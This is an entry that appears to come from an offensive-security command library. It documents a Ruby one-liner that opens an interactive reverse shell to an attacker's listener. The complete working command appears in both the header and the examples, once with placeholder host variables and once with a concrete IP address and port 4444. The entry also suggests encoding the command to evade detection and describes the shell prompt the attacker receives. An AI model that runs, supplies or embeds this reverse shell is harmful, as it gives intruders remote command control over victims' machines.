---
type: command
executor: bash
data: >-
  ruby -rsocket -e'f=TCPSocket.open("$_ATTACKER_IP",$_PORT).to_i;exec
  sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
output: null
created_at: '2024-01-01T00:00:00Z'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Linux
tags:
  - reverse-shell
  - ruby
verified: true
validated: true
---

# ruby-interactive-reverse-shell

## Command

```bash
ruby -rsocket -e'f=TCPSocket.open("$_ATTACKER_IP",$_PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Description

This command establishes an interactive reverse shell using Ruby on Unix-like systems. It connects back to the attacker's listener and redirects the shell's I/O to the socket, allowing full command interaction.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ATTACKER_IP | IP address of the attacker's listener | Yes |
| $_PORT | Port on which the attacker is listening | Yes |
| -rsocket | Loads Ruby's socket library | Built-in |
| -e | Executes the following Ruby expression | Built-in |

## Examples

### Basic Usage

```bash
ruby -rsocket -e'f=TCPSocket.open("192.168.1.100",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Advanced Usage

Use in a script or combined with encoding for evasion.

## Expected Output

No direct output on the target; instead, the attacker's listener (e.g., netcat) receives a shell prompt like `uid=1000(user) gid=1000(user) groups=1000(user) $`, indicating successful connection and shell access.

## Related

- [[procedures/Establish-Ruby-Reverse-Shell]]
- [[commands/ruby-remote-command-execution-unix]]
